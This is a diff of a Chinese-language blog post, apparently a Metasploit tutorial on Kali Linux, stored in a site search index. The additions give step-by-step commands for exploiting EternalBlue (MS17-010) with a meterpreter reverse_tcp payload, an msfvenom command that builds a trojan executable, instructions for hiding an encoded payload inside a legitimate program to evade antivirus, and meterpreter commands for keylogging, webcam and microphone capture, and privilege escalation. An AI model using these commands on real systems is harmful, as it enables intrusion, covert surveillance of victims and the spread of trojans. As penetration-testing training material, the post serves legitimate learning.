@@ -1281,30 +1281,83 @@
     <title>Kali使用msf演示</title>
     <url>/post/4cf34f0f.html</url>
     <content><![CDATA[<h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
-<p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
+<p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。是目前最流行、最强大、最具拓展性的渗透测试平台，一定程度上统一了渗透测试和漏洞研究的工作环境，使得新的攻击代码比较容易加入框架。<span id="more"></span></p>
 <p><img src="https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
 <p>模块分为：</p>
-<p>辅助模块———————AUX</p>
+<p>辅助模块———————AUX(auxiliary module)</p>
 <p>渗透攻击模块————exploits</p>
 <p>后渗透攻击模块———post</p>
 <p>攻击载荷模块————-payloads</p>
 <p>编码器模块——————encoders</p>
 <p>空指令模块——————nops</p>
-<h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
+<h1 id="2-MSF基本使用"><a href="#2-MSF基本使用" class="headerlink" title="2 MSF基本使用"></a>2 MSF基本使用</h1><h2 id="2-1-功能模块"><a href="#2-1-功能模块" class="headerlink" title="2.1 功能模块"></a>2.1 功能模块</h2><p><img src="https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220403-image-20220403202025307.png" alt="image-20220403202025307"></p>
+<p>MSF主目录为/usr/share/metasploit-framework/,其中包括了config配置文件、plugins插件、tools工具、db数据库文件、modules模块文件以及msfconsole、msfdb等命令，modules中的文件为我们最常用的模块文件，其中每个模块中都根据不同的操作系统，分为不同平台不同协议功能对应的漏洞利用文件，这些文件用ruby编写。</p>
+<p>modules中的模块主要包括：</p>
+<p><code>exploits</code>:利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法，是一个流程性概念，其利用过程中可能用到payloads或shellcode等</p>
+<p><code>payloads</code>:成功exploit后，攻击过程中执行的代码或指令。可以是能够反弹shell的shellcode，也可以是直接在目标系统上直接执行的系统命令，默认有三类payloads，分别为：</p>
+<ul>
+<li>singles:要执行的所有代码都放在一个文件中，没有外部依赖，因此文件比较大，可能会因为攻击目标内存空间受限而无法使用</li>
+<li>stagers:传输一个较小的payload用于建立连接，后续再传输具体攻击payload(也就是stages)</li>
+<li>stages:利用stagers建立连接后，后续再传输的代码</li>
+</ul>
+<p><code>auxiliary</code>:没有payload的exploits模块，一般在信息收集阶段使用</p>
+<p><code>encoders</code>:对payloads进行加密，躲避AV检查的模块</p>
+<h2 id="2-2-基本命令"><a href="#2-2-基本命令" class="headerlink" title="2.2 基本命令"></a>2.2 基本命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole   #启动MSF console界面</span><br><span class="line"> </span><br><span class="line">msfupdate    #msf版本更新</span><br><span class="line"> </span><br><span class="line">help/?       #打印当下窗口的帮助文档</span><br><span class="line"> </span><br><span class="line">help command/command --help #打印command命令的帮助文档</span><br><span class="line"> </span><br><span class="line">connect      #可以看成是msfconsole界面下的nc工具</span><br><span class="line"> </span><br><span class="line">edit         #编辑模块的ruby文件，与用vim编辑相同</span><br><span class="line"> </span><br><span class="line">show         #查看命令，可以看当前环境下的exploits、auxiliary、payloads等模块,其中Rank表示不同模块的评级（成功率和使用难易程度的重要参考），</span><br><span class="line"> </span><br><span class="line">             #最常使用的是`show options`命令，表示当前上下文环境中的选项内容,`show missing`可以查看当前有哪些必须的配置没有设置</span><br><span class="line"> </span><br><span class="line">show advanced   #一些不常用的高级选项，不会在`show options`中显示</span><br><span class="line"> </span><br><span class="line">search       #搜索关键词内容对应的模块，如搜索ms10_046漏洞模块：</span><br><span class="line">（注意搜索出的内容所在基本目录为`/usr/share/metasploit-framework/modules/`）,除此之外search还可以添加一些筛选条件，如name、path、type等</span><br><span class="line"> </span><br><span class="line">info         #当前模块的基本信息</span><br><span class="line"> </span><br><span class="line">use          #使用不同的模块文件</span><br><span class="line"> </span><br><span class="line">set/unset    #设置变量/取消变量设置</span><br><span class="line"> </span><br><span class="line">setg/unsetg  #设置全局变量/取消全局变量设置，只会设置当前msf运行环境中的变量，退出msf后设置就复位</span><br><span class="line"> </span><br><span class="line">save         #将设置保存到/root/.msf4/config，msf启动时会读取该文件，这样重新启动msf后设置依然保留</span><br><span class="line"> </span><br><span class="line">back         #从模块上下文退回到msfconsole初始目录</span><br><span class="line"> </span><br><span class="line">run/exploit  #运行漏洞模块</span><br><span class="line"> </span><br><span class="line">sessions     #可以看见当前已经建立的攻击连接，利用`sessions -i id`命令进入指定连接</span><br><span class="line"> </span><br><span class="line">jobs         #查看后台运行的模块</span><br><span class="line"> </span><br><span class="line">load/unload  #连接插件，如load openvas，然后会出现相应的openvas命令，使用时需要用openvas_connect连接外部扫描器</span><br><span class="line"> </span><br><span class="line">loadpath     #调用自己编写的功能模块</span><br><span class="line"> </span><br><span class="line">route        #向session指定路由</span><br><span class="line"> </span><br><span class="line">resource     #调用rc文件的命令并执行，以方便直接取得session</span><br></pre></td></tr></table></figure>
+<h2 id="2-3-数据库命令"><a href="#2-3-数据库命令" class="headerlink" title="2.3 数据库命令"></a>2.3 数据库命令</h2><p><strong>(1)数据库管理所用的命令为msfdb命令:</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line">msfdb delete</span><br><span class="line"></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line">msfdb stop</span><br></pre></td></tr></table></figure>
+<p><strong>(2)在msfconsole中数据库管理命包括：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db_connect</span><br><span class="line"></span><br><span class="line">db_disconnect</span><br><span class="line"></span><br><span class="line">db_status         #查看数据库状态，有无连接</span><br><span class="line"></span><br><span class="line">db_nmap           #后续可以用hosts命令来查询扫描出的主机</span><br><span class="line"></span><br><span class="line">db_rebuild_cache  #建立模块文件的缓存，使search搜索速度更快        </span><br><span class="line"></span><br><span class="line">db_remove</span><br><span class="line"></span><br><span class="line">db_export         #导出备份信息</span><br><span class="line"></span><br><span class="line">db_import         #导入备份信息，备份为xml文件</span><br></pre></td></tr></table></figure>
+<p>其中db_namp在namp功能基础上，将搜索的数据存入数据库方便后续查询</p>
+<h1 id="3-MSF模块使用"><a href="#3-MSF模块使用" class="headerlink" title="3 MSF模块使用"></a>3 MSF模块使用</h1><h2 id="3-1-Exploit模块"><a href="#3-1-Exploit模块" class="headerlink" title="3.1 Exploit模块"></a>3.1 Exploit模块</h2><p>这个模块分为两类，Active exploit和Passive exploit，具体有如下区别：</p>
+<p><strong>Active exploit</strong>，攻击目标开放了某个端口服务，攻击者利用exploit传输payload，是攻击目标反弹shell或者建立连接连入攻击者，也就是说攻击者主动发起攻击，一般去分散成服务器端程序，最常用的。</p>
+<p><em>注：永恒之蓝ms17_010_eternalblue是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码，它影响的范围包括win7和sever 2008的所有版本系统。</em></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eg1: 永恒之蓝漏洞利用</span><br><span class="line">usr auxiliary/scanner/smb/smb_ms17_010 #进行漏洞分析，看445端口能否被入侵</span><br><span class="line">set rhosts 192.168.200.134</span><br><span class="line">run #如果结果中出现`Host is likely VULNERABLE to MS17-010`，则说明主机很可能有永恒之蓝漏洞</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set RHOSTS 192.168.200.134</span><br><span class="line">set lhosts 192.168.200.132</span><br><span class="line">set lport 3333</span><br><span class="line">run        #随后可以看到进入了meterpreter</span><br></pre></td></tr></table></figure>
+<p><strong>Passive exploit</strong>，利用客户端程序的漏洞，客户端向存在exploit的服务端发送请求，返回的漏洞利用代码使得客户端可以反弹shell <strong>(reverse_tcp)</strong>或者反向建立连接<strong>(bind_tcp)</strong>连入攻击者，也就是说攻击者诱使攻击目标连接服务程序，通过返回的代码完成攻击，一般去攻击客户端程序。</p>
+<h2 id="3-2-Payload-Encoder模块"><a href="#3-2-Payload-Encoder模块" class="headerlink" title="3.2 Payload/Encoder模块"></a>3.2 Payload/Encoder模块</h2><p>Payload是在攻击目标主机中真正执行的代码，它不仅可以用exploit模块加载，而且也可以作为独立的个体，通过诱使攻击目标运行而发动攻击。</p>
+<p>Payload模块可以用generate命令修改代码：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">generate         #把Payload代码以16进制格式输出</span><br><span class="line">generate -b &#x27;xx&#x27; #除去Payload中的坏字符&#x27;xx&#x27;，除去的过程是重新编码，MSF会选择最佳的Encoder方式</span><br><span class="line">generate -i 5 -x &#x27;yyy.exe&#x27; -f &#x27;xyyy.exe&#x27; #对Payload加密5轮，将Payload附加在yyy.exe程序中，生成新的程序命名为xyyy.exe</span><br><span class="line">                                         #这样xyyy.exe在目标主机上执行时，yyy.exe功能不发生变化，而Payload会被执行</span><br><span class="line">generate -s 10   #在Payload前生成10个nop字节（nop：EIP返回到存储nop sled的任意地址时将递增，最终导致shellcode执行）</span><br><span class="line">generate -t c    #生成c语言格式的Payload</span><br></pre></td></tr></table></figure>
+<h1 id="4-METERPRETER"><a href="#4-METERPRETER" class="headerlink" title="4 METERPRETER"></a>4 METERPRETER</h1><h2 id="4-1-meterpreter是什么"><a href="#4-1-meterpreter是什么" class="headerlink" title="4.1 meterpreter是什么"></a>4.1 meterpreter是什么</h2><p>获取目标访问权限之后，Meterpreter用于后面的渗透测试。</p>
+<h2 id="4-2-meterpreter常用命令"><a href="#4-2-meterpreter常用命令" class="headerlink" title="4.2 meterpreter常用命令"></a>4.2 meterpreter常用命令</h2><blockquote>
+<p>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p>
+</blockquote>
+<h1 id="5-MSFCLI"><a href="#5-MSFCLI" class="headerlink" title="5 MSFCLI"></a>5 MSFCLI</h1><p>msfcli是metasploit提供的一种命令行接口，在使用时一句命令完成所有动作，由<code>msdconsole -x进入</code>，使用cli接口的目的主要是编写脚本时便于引用，如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -x &#x27;use exploit/windows/smb/ms08_067+netapi;</span><br><span class="line">set RHOST 1.1.1.1;set PAYLOAD windows/meterpreter/reverse_tcp;</span><br><span class="line">set LHOST 1.1.1.6;set LPORT 5555;set target 34;exploit&#x27;</span><br></pre></td></tr></table></figure>
+<h1 id="6-ms17-010漏洞利用"><a href="#6-ms17-010漏洞利用" class="headerlink" title="6 ms17_010漏洞利用"></a>6 ms17_010漏洞利用</h1><h2 id="6-1-基本命令"><a href="#6-1-基本命令" class="headerlink" title="6.1 基本命令"></a>6.1 基本命令</h2><ol>
 <li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
 <p>这里显示的是我们有多少个模块<img src="https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
 </li>
 <li><p>常用命令</p>
 <p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
 <p>比如<code>search ms17_010</code>搜索这个漏洞</p>
+<p><em>注：<code>ms17_010_netapi.rb</code>是微软漏洞的编号方式，不同标准有不同的编号方式。ms17_010漏洞，过Tcp端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只需要开机上网，攻击者就能在电脑和服务器中植入勒索软件</em></p>
 <p><img src="https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
 <p>rank是等级，按可靠性降序排列</p>
 <p>excellent——-great—good—-normal—-average—-low—-manual</p>
 </li>
 </ol>
-<h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
+<h2 id="6-2-生成可执行木马"><a href="#6-2-生成可执行木马" class="headerlink" title="6.2 生成可执行木马"></a>6.2 生成可执行木马</h2><ol>
 <li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
+<blockquote>
+<p>大致参数介绍</p>
+<p>-l, —list <type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,……all</p>
+<p>-p, —payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</p>
+<p>-f, —format &lt; format&gt; 指定输出格式</p>
+<p>-e, —encoder <encoder> 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</p>
+<p>-a, —arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</p>
+<p>-o, —out &lt; path&gt; 指定创建好的payload的存放位置</p>
+<p>-b, —bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 ‘\x0f’、’\x00’</p>
+<p>-n, —nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</p>
+<p>-s, —space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</p>
+<p>-i, —iterations &lt; count&gt; 指定payload的编码次数</p>
+<p>-c, —add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</p>
+<p>-x, —template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</p>
+<p>-k, —keep 保护模板程序的动作，注入的payload作为一个新的进程运行</p>
+<p>-v, —var-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式</p>
+<p>-t, —timeout <second> 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）</p>
+<p>-h,—help 查看帮助选项</p>
+<p>—platform &lt; platform&gt; 指定payload的目标平台</p>
+</blockquote>
 </li>
 <li><p><code>msfconsole</code>打开msf</p>
 </li>
@@ -1332,7 +1385,6 @@
 <p>(2)更多命令</p>
 <blockquote>
 <p>cmd指令:<br>cat 读取文件内容到屏幕<br>cd 更改目录<br>checksum 检索文件的校验和<br>cp 将源复制到目标<br>del 删除指定文件<br>dir 列出文件（ls 的别名）<br>下载 下载文件或目录<br>编辑 编辑文件<br>getlwd 打印本地工作目录<br>getwd 打印工作目录<br>lcd 更改本地工作目录<br>lls 列出本地文件<br>lpwd 打印本地工作目录<br>ls 列出文件<br>mkdir 创建目录<br>mv 将源移动到目标<br>pwd 打印工作目录<br>rm 删除指定文件<br>rmdir 删除目录<br>search 搜索文件<br>show_mount 列出所有挂载点/逻辑驱动器<br>upload 上传文件或目录<br>pkill 按名称终止进程</p>
-<p>meterpreter命令：<br>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p>
 </blockquote>
 </li>
 </ol>
